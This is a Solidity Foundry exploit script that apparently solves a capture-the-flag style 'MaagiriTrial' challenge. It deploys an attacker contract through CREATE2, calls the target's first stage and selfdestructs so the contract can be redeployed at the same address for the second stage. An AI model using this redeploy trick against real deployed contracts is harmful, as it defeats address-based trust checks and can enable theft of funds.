// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8;

import "forge-std/Script.sol";
import "forge-std/console.sol";

contract AttackMaagiriTrialScript is Script {
    function run() external {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(privateKey);
        IMaagiriTrial trial = IMaagiriTrial(
            0x4d8E37e3a61F9283d6d26364710cbae3d7e63E20
        );
        // AttackMaagiriTrialFactory factory = new AttackMaagiriTrialFactory();
        AttackMaagiriTrialFactory factory = AttackMaagiriTrialFactory(
            0xD3eb9f3088ad48528fE2E6d2fbf8740EB269168b
        );
        AttackMaagiriTrial attacker = AttackMaagiriTrial(factory.deploy2());

        attacker.firstStage(trial);
        // attacker.secondStage(trial);

        vm.stopBroadcast();
    }
}

contract AttackMaagiriTrial {
    uint256 public immutable x;

    constructor() {
        x = block.number;
    }

    function firstStage(IMaagiriTrial trial) external {
        trial.firstStage();
        selfdestruct(payable(msg.sender));
    }

    function secondStage(IMaagiriTrial trial) external {
        trial.secondStage();
    }
}

contract AttackMaagiriTrialFactory {
    function deploy() external returns (address) {
        bytes memory bytecode = type(AttackMaagiriTrial).creationCode;
        address addr;
        assembly {
            addr := create2(
                0,
                // Actual code starts after skipping the first 32 bytes
                add(bytecode, 0x20),
                mload(bytecode), // Load the size of code contained in the first 32 bytes
                0 // Salt
            )

            if iszero(extcodesize(addr)) {
                revert(0, 0)
            }
        }
        console.log(addr);
        return addr;
    }

    function deploy2() external returns (address) {
        AttackMaagiriTrial trial = new AttackMaagiriTrial{salt: 0}();
        console.log(address(trial));
        return address(trial);
    }
}

interface IMaagiriTrial {
    function isPassed() external view returns (bool);

    function firstStage() external;

    function secondStage() external;
}
